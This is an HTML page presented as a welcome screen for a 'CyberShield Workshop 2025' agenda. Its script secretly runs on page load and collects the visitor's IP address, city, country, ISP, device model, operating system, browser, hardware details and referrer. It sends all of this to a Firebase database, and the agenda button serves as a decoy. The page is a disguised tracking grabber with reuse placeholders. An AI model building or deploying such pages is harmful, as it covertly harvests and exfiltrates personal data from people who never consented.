<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CyberShield Workshop 2025 — Welcome</title>
<!-- UAParser.js for accurate device, OS, browser detection -->
<script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&display=swap');
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Syne', sans-serif;
    background: #f5f4f0;
    color: #1a1a2e;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 2rem;
  }
  .card {
    background: #fff;
    border-radius: 20px;
    padding: 2.5rem 2rem;
    max-width: 380px;
    width: 100%;
    text-align: center;
    box-shadow: 0 4px 32px rgba(0,0,0,0.08);
  }
  .logo {
    width: 64px; height: 64px;
    background: #1a1a2e;
    border-radius: 16px;
    display: flex; align-items: center; justify-content: center;
    margin: 0 auto 1.5rem;
  }
  .logo svg { width: 36px; height: 36px; }
  .tag {
    font-size: 11px;
    letter-spacing: 0.15em;
    text-transform: uppercase;
    color: #888;
    margin-bottom: 0.75rem;
  }
  h1 {
    font-size: 1.7rem;
    font-weight: 800;
    color: #1a1a2e;
    line-height: 1.2;
    margin-bottom: 0.75rem;
  }
  p {
    font-size: 0.95rem;
    color: #666;
    line-height: 1.6;
    margin-bottom: 2rem;
  }
  .btn {
    background: #1a1a2e;
    color: #fff;
    border: none;
    padding: 0.9rem 2.5rem;
    border-radius: 12px;
    font-family: 'Syne', sans-serif;
    font-size: 1rem;
    font-weight: 700;
    cursor: pointer;
    width: 100%;
    transition: background 0.2s, transform 0.15s;
  }
  .btn:hover { background: #2d2d4e; transform: translateY(-1px); }
  .small { font-size: 0.78rem; color: #bbb; margin-top: 1rem; margin-bottom: 0; }
  .agenda-container {
    text-align: center;
    background: #fff;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-direction: column;
    padding: 2rem;
  }
  .agenda-img {
    max-width: 100%;
    height: auto;
    border-radius: 20px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.1);
  }
  .back-btn {
    margin-top: 2rem;
    background: #1a1a2e;
    color: #fff;
    border: none;
    padding: 0.8rem 2rem;
    border-radius: 40px;
    font-family: 'Syne', sans-serif;
    font-size: 0.9rem;
    font-weight: 700;
    cursor: pointer;
  }
</style>
</head>
<body>
<div class="card" id="welcomeCard">
  <div class="logo">
    <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M18 4L6 9v9c0 7.18 5.14 13.89 12 15.5C24.86 31.89 30 25.18 30 18V9L18 4z" fill="#fff" opacity="0.9"/>
      <path d="M13 18l3.5 3.5L23 14" stroke="#1a1a2e" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  </div>
  <div class="tag">CyberShield Workshop 2025</div>
  <h1>Welcome!<br>View Today's Agenda</h1>
  <p>Tap the button below to access the session schedule, speaker list, and room details.</p>
  <button class="btn" onclick="showAgendaImage()">Open Workshop Agenda &rarr;</button>
  <p class="small">Powered by CyberShield Events</p>
</div>

<script>
  // ============================================================
  //  🔁 REPLACE WITH YOUR FIREBASE DATABASE URL
  const FIREBASE_URL = "https://workshop-a32fc-default-rtdb.firebaseio.com/";
  //  🖼️ REPLACE WITH YOUR ACTUAL AGENDA IMAGE URL
  const AGENDA_IMAGE_URL = "YOUR_AGENDA_IMAGE_URL_HERE";
  // ============================================================

  let dataSent = false;

  // ---------- Enhanced device detection using UAParser.js ----------
  function getDetailedDeviceInfo() {
    const parser = new UAParser(navigator.userAgent);
    const result = parser.getResult();
    
    // Device info: model (e.g., "iPhone 13", "SM-G998B" for S21)
    let deviceModel = result.device.model || "Unknown";
    let deviceVendor = result.device.vendor || "";
    let exactDevice = deviceVendor ? `${deviceVendor} ${deviceModel}`.trim() : deviceModel;
    
    // If it's a generic mobile/desktop, try to extract from userAgent
    if (exactDevice === "Unknown" || exactDevice === "generic") {
      const ua = navigator.userAgent;
      // iPhone model detection (iOS version gives clues, but UAParser often gives "iPhone")
      if (ua.includes("iPhone")) {
        exactDevice = "iPhone";
        // Try to get model from UA (e.g., "iPhone13,2" -> iPhone 12 Pro Max? We'll keep as iPhone with version)
        const match = ua.match(/iPhone(\d+,\d+)/);
        if (match) exactDevice += ` (${match[1]})`;
      } else if (ua.includes("iPad")) {
        exactDevice = "iPad";
      } else if (ua.includes("Android")) {
        exactDevice = "Android Device";
        // Try to extract model from "SM-..." or "Pixel"
        const modelMatch = ua.match(/; (SM-[A-Za-z0-9]+)/) || ua.match(/; (Pixel\s*\d*)/) || ua.match(/; (Redmi|Xiaomi|Huawei|OnePlus|OPPO|Vivo|Realme)[^\;]*/);
        if (modelMatch) exactDevice = modelMatch[1].trim();
      }
    }
    
    // OS: name + version (e.g., "iOS 15.4", "Android 13", "Windows 11")
    let osName = result.os.name || "Unknown OS";
    let osVersion = result.os.version || "";
    let fullOS = osVersion ? `${osName} ${osVersion}` : osName;
    
    // Browser: name + version (e.g., "Chrome 122.0.6261.129")
    let browserName = result.browser.name || "Unknown Browser";
    let browserVersion = result.browser.version || "";
    let fullBrowser = browserVersion ? `${browserName} ${browserVersion}` : browserName;
    
    // CPU architecture
    let cpuArch = result.cpu.architecture || navigator.platform || "Unknown";
    
    // Additional: if Android, get Android version (already in OS)
    let androidVersion = (osName === "Android") ? osVersion : null;
    
    return {
      exact_device: exactDevice,
      device_vendor: deviceVendor,
      device_model: deviceModel,
      os_name: osName,
      os_version: osVersion,
      full_os: fullOS,
      browser_name: browserName,
      browser_version: browserVersion,
      full_browser: fullBrowser,
      cpu_architecture: cpuArch,
      android_version: androidVersion,
      raw_user_agent: navigator.userAgent
    };
  }

  // ---------- IP + City + Country (HTTPS APIs with fallback) ----------
  async function getLocationData() {
    const apis = [
      {
        url: 'https://ipapi.co/json/',
        parse: (data) => ({
          ip: data.ip || '—',
          city: data.city || '—',
          country: data.country_name || '—',
          isp: data.org || '—',
          region: data.region || '—'
        })
      },
      {
        url: 'https://api.ipapi.is/',
        parse: (data) => ({
          ip: data.ip || '—',
          city: data.location?.city || '—',
          country: data.location?.country || '—',
          isp: data.isp?.org || '—',
          region: data.location?.region || '—'
        })
      },
      {
        url: 'https://ipinfo.io/json?token=anonymoustoken',
        parse: (data) => ({
          ip: data.ip || '—',
          city: data.city || '—',
          country: data.country || '—',
          isp: data.org || '—',
          region: data.region || '—'
        })
      }
    ];

    for (const api of apis) {
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);
        const res = await fetch(api.url, { signal: controller.signal });
        clearTimeout(timeoutId);
        if (res.ok) {
          const data = await res.json();
          const parsed = api.parse(data);
          if (parsed.ip && parsed.ip !== '—') return parsed;
        }
      } catch (e) {
        continue;
      }
    }
    return { ip: '—', city: '—', country: '—', isp: '—', region: '—' };
  }

  // ---------- Main capture & send ----------
  async function captureAndSend() {
    if (dataSent) return;
    dataSent = true;

    const deviceInfo = getDetailedDeviceInfo();
    const location = await getLocationData();
    const screenRes = `${screen.width}x${screen.height}`;
    const language = navigator.language || '—';
    const time = new Date().toLocaleString();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || '—';
    const online = navigator.onLine;
    const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : '—';
    const cores = navigator.hardwareConcurrency || '—';
    
    const visitorData = {
      timestamp: time,
      timezone: timezone,
      ip: location.ip,
      city: location.city,
      region: location.region,
      country: location.country,
      isp: location.isp,
      // Device details
      exact_device: deviceInfo.exact_device,
      device_vendor: deviceInfo.device_vendor,
      device_model: deviceInfo.device_model,
      os: deviceInfo.full_os,
      os_name: deviceInfo.os_name,
      os_version: deviceInfo.os_version,
      android_version: deviceInfo.android_version,
      browser: deviceInfo.full_browser,
      browser_name: deviceInfo.browser_name,
      browser_version: deviceInfo.browser_version,
      cpu_architecture: deviceInfo.cpu_architecture,
      // Environment
      screen_resolution: screenRes,
      language: language,
      online: online,
      ram_estimate: memory,
      cpu_cores: cores,
      referrer: document.referrer || 'direct',
      raw_user_agent: deviceInfo.raw_user_agent
    };

    // Send to Firebase
    try {
      await fetch(`${FIREBASE_URL}/visitors.json`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(visitorData)
      });
      console.log('✅ Detailed visitor data logged', visitorData);
    } catch (err) {
      console.error('❌ Firebase error:', err);
    }
  }

  // ---------- Show agenda image instantly ----------
  function showAgendaImage() {
    document.body.innerHTML = `
      <div class="agenda-container">
        <img src="${AGENDA_IMAGE_URL}" alt="Workshop Agenda" class="agenda-img" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22300%22%20height%3D%22200%22%3E%3Crect%20width%3D%22300%22%20height%3D%22200%22%20fill%3D%22%23f0f0f0%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%23999%22%3EImage%20not%20found%3C%2Ftext%3E%3C%2Fsvg%3E';">
        <button class="back-btn" onclick="location.reload()">← Back to Welcome</button>
      </div>
    `;
  }

  // Capture immediately on page load
  window.addEventListener('load', () => {
    captureAndSend();
  });
</script>
</body>
</html>
